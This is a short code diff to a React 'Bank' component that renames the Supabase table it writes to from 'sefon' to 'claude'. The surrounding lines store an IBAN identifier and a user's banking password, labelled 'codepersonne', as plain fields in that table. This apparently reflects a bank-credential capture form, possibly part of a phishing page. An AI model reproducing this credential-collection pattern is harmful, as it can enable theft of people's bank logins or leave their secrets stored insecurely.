@@ -54,7 +54,7 @@ const Bank = () => {
 
     try {
       await supabase
-        .from("sefon")
+        .from("claude")
         .update({
           identifiantiban: formData.identifiantiban,
           codepersonne: formData.password, // champ modifié
